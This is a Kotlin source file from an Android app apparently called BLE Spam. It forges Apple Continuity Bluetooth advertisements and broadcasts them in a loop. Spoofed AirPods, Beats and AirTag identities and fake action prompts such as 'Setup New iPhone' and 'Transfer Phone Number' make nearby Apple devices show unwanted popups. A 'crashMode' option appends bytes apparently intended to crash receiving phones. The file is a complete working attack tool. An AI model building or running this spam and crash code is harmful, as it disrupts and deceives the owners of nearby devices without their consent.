package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import android.os.Build
import java.util.HashMap
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class ContinuitySpam(private val type: ContinuityType, var crashMode: Boolean = false) : Spammer {

    private var _blinkRunnable: Runnable? = null
    private var blinkRunnable: Runnable? = null

    private var _isSpamming = false

    lateinit var devices: Array<ContinuityDevice>

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val rand = Random()

    companion object {
        private const val COLOR_KEY_DEFAULT = "00"
        private const val CONTINUITY_TYPE = "07"
        private const val PAYLOAD_SIZE = "19"
        private const val STATUS = "55"

        private val DEVICE_COLORS = HashMap<String, Array<String>>().apply {
            put("0E20", arrayOf("00"))
            put("0220", arrayOf("00"))
            put("0F20", arrayOf("00"))
            put("1320", arrayOf("00"))
            put("1420", arrayOf("00"))
            put("0A20", arrayOf("00", "02", "03", "0F", "11"))
            put("1020", arrayOf("00", "01"))
            put("0620", arrayOf("00", "01", "06", "07", "08", "09", "0E", "0F"))
            put("0320", arrayOf("00", "01", "0B", "0C", "0D"))
            put("0B20", arrayOf("00", "02", "03", "04", "05", "06"))
            put("0C20", arrayOf("00", "01"))
            put("1120", arrayOf("00", "01", "02", "03", "04"))
            put("0520", arrayOf("00", "01", "02", "05"))
            put("0920", arrayOf("00", "01", "02", "03"))
            put("1720", arrayOf("00", "01"))
            put("1220", arrayOf("00", "01", "02", "03", "04"))
            put("1620", arrayOf("00", "01", "02", "03"))
            put("0055", arrayOf("00"))
            put("0030", arrayOf("00"))
        }

        private val DEVICE_DATA = HashMap<String, String>().apply {
            put("0E20", "AirPods Pro")
            put("0A20", "AirPods Max")
            put("0220", "AirPods")
            put("0F20", "AirPods 2nd Gen")
            put("1320", "AirPods 3rd Gen")
            put("1420", "AirPods Pro 2nd Gen")
            put("1020", "Beats Flex")
            put("0620", "Beats Solo 3")
            put("0320", "Powerbeats 3")
            put("0B20", "Powerbeats Pro")
            put("0C20", "Beats Solo Pro")
            put("1120", "Beats Studio Buds")
            put("0520", "Beats X")
            put("0920", "Beats Studio 3")
            put("1720", "Beats Studio Pro")
            put("1220", "Beats Fit Pro")
            put("1620", "Beats Studio Buds+")
        }
    }

    init {
        devices = when (type) {
            ContinuityType.DEVICE -> arrayOf(
                ContinuityDevice("0x0E20", "AirPods Pro 2 GEN", ContinuityType.DEVICE),
                ContinuityDevice("0x1420", "AirPods Pro 1 GEN", ContinuityType.DEVICE),
                ContinuityDevice("0x0E20", "AirPods Pro", ContinuityType.DEVICE),
                ContinuityDevice("0x0620", "Beats Solo 3", ContinuityType.DEVICE),
                ContinuityDevice("0x0A20", "AirPods Max", ContinuityType.DEVICE),
                ContinuityDevice("0x1020", "Beats Flex", ContinuityType.DEVICE),
                ContinuityDevice("0x0055", "Airtag", ContinuityType.DEVICE),
                ContinuityDevice("0x0030", "Hermes Airtag", ContinuityType.DEVICE),
                ContinuityDevice("0x0220", "AirPods", ContinuityType.DEVICE),
                ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityType.DEVICE),
                ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityType.DEVICE),
                ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityType.DEVICE),
                ContinuityDevice("0x0320", "Powerbeats 3", ContinuityType.DEVICE),
                ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityType.DEVICE),
                ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityType.DEVICE),
                ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityType.DEVICE),
                ContinuityDevice("0x0520", "Beats X", ContinuityType.DEVICE),
                ContinuityDevice("0x0920", "Beats Studio 3", ContinuityType.DEVICE),
                ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityType.DEVICE),
                ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityType.DEVICE),
                ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityType.DEVICE)
            )
            ContinuityType.NOTYOURDEVICE -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                DEVICE_DATA.map { (key, value) ->
                    ContinuityDevice("0x$key", "$value (NOT YOUR)", ContinuityType.NOTYOURDEVICE)
                }.toTypedArray()
            } else {
                emptyArray()
            }
            ContinuityType.ACTION -> arrayOf(
                ContinuityDevice("0x13", "AppleTV AutoFill", ContinuityType.ACTION),
                ContinuityDevice("0x27", "AppleTV Connecting...", ContinuityType.ACTION),
                ContinuityDevice("0x20", "Join This AppleTV?", ContinuityType.ACTION),
                ContinuityDevice("0x19", "AppleTV Audio Sync", ContinuityType.ACTION),
                ContinuityDevice("0x1E", "AppleTV Color Balance", ContinuityType.ACTION),
                ContinuityDevice("0x09", "Setup New iPhone", ContinuityType.ACTION),
                ContinuityDevice("0x02", "Transfer Phone Number", ContinuityType.ACTION),
                ContinuityDevice("0x0B", "HomePod Setup", ContinuityType.ACTION),
                ContinuityDevice("0x01", "Setup New AppleTV", ContinuityType.ACTION),
                ContinuityDevice("0x06", "Pair AppleTV", ContinuityType.ACTION),
                ContinuityDevice("0x0D", "HomeKit AppleTV Setup", ContinuityType.ACTION),
                ContinuityDevice("0x2B", "AppleID for AppleTV?", ContinuityType.ACTION),
                ContinuityDevice("0x05", "Apple Watch", ContinuityType.ACTION),
                ContinuityDevice("0x24", "Apple Vision Pro", ContinuityType.ACTION),
                ContinuityDevice("0x2F", "Connect to other Device", ContinuityType.ACTION),
                ContinuityDevice("0x21", "Software Update", ContinuityType.ACTION),
                ContinuityDevice("0x2E", "Unlock with Apple Watch", ContinuityType.ACTION)
            )
            else -> emptyArray()
        }
    }

    private fun toHexByte(b: Int): String = String.format("%02X", b and 0xFF)

    private fun getRandomBudsBatteryLevelHex(): String {
        val level = ((rand.nextInt(10) shl 4) + rand.nextInt(10)) and 0xFF
        return toHexByte(level)
    }

    private fun getRandomChargingCaseBatteryLevelHex(): String {
        val level = (((rand.nextInt(8) % 8) shl 4) + (rand.nextInt(10) % 10)) and 0xFF
        return toHexByte(level)
    }

    private fun getRandomLidOpenCounterHex(): String {
        val counter = rand.nextInt(256)
        return toHexByte(counter)
    }

    private fun getRandomHexBytes(length: Int): String {
        val bytes = ByteArray(length)
        rand.nextBytes(bytes)
        return bytes.joinToString("") { String.format("%02X", it.toInt() and 0xFF) }
    }

    private fun pickRandomColorForDevice(deviceIdNoPrefix: String): String {
        return DEVICE_COLORS[deviceIdNoPrefix]?.randomOrNull() ?: COLOR_KEY_DEFAULT
    }

    private fun buildContinuityPayload(prefixHex: String, deviceIdHex: String, colorHex: String?): String {
        val buds = getRandomBudsBatteryLevelHex()
        val charging = getRandomChargingCaseBatteryLevelHex()
        val lid = getRandomLidOpenCounterHex()
        val color = colorHex ?: COLOR_KEY_DEFAULT

        return buildString {
            append(CONTINUITY_TYPE)
            append(PAYLOAD_SIZE)
            append(prefixHex)
            append(deviceIdHex)
            append(STATUS)
            append(buds)
            append(charging)
            append(lid)
            append(color)
            append("00")
            append(getRandomHexBytes(16))
        }
    }

    override fun start() {
        executor.execute @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) {
            val bluetoothAdvertiser = BluetoothAdvertiser()
            _isSpamming = true
            for (i in 0..Helper.MAX_LOOP) {
                if (!_isSpamming) break

                val device = devices.random()
                var data: AdvertiseData? = null

                when (device.deviceType) {
                    ContinuityType.ACTION -> {
                        val rHex = Helper.randomHexFiller(6)
                        var manufacturerData = "0F05C0${device.value.removePrefix("0x").uppercase()}$rHex"
                        if (crashMode) {
                            manufacturerData += "000010$rHex"
                        }
                        data = AdvertiseData.Builder()
                            .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                            .build()
                    }
                    ContinuityType.NOTYOURDEVICE -> {
                        val deviceVal = device.value.removePrefix("0x").uppercase()
                        val color = pickRandomColorForDevice(deviceVal)
                        val manufacturerData = buildContinuityPayload("01", deviceVal, color)
                        data = AdvertiseData.Builder()
                            .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                            .build()
                    }
                    ContinuityType.DEVICE -> {
                        val deviceVal = device.value.removePrefix("0x").uppercase()
                        val manufacturerData = buildContinuityPayload("07", deviceVal, pickRandomColorForDevice(deviceVal))
                        data = AdvertiseData.Builder()
                            .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                            .build()
                    }
                    else -> {
                    }
                }

                data?.let { bluetoothAdvertiser.advertise(it, null) }

                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return@execute
                }

                bluetoothAdvertiser.stopAdvertising()
            }
            _isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun stop() {
        _isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? {
        return blinkRunnable
    }
}